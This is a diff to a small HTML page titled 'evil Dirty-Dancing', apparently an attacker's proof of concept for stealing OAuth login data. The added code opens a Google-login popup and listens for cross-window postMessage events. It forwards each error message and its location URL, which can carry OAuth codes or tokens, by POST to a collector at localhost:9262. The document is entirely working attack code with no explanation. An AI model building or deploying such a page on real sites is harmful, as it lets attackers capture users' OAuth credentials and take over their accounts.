@@ -4,10 +4,31 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dirty-Dancing</title>
+  <title>evil Dirty-Dancing</title>
 </head>
 <body>
   <h1>evil</h1>
-  <a href="/oauth">googleでろぐいん</a>
+  <button onclick="window.open('/oauth', '_blank', 'popup')">googleでろぐいん</button>
+
+  <script>
+    window.addEventListener('message', (e) => {
+      if (e.data.type === 'error') {
+        fetch("http://localhost:9262/receiver", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            message: e.data.message,
+            location: e.data.location
+          })
+        }).then(res => {
+          console.log(res)
+        }).catch(err => {
+          console.log(err);
+        })
+      }
+    });
+  </script>
 </body>
 </html>
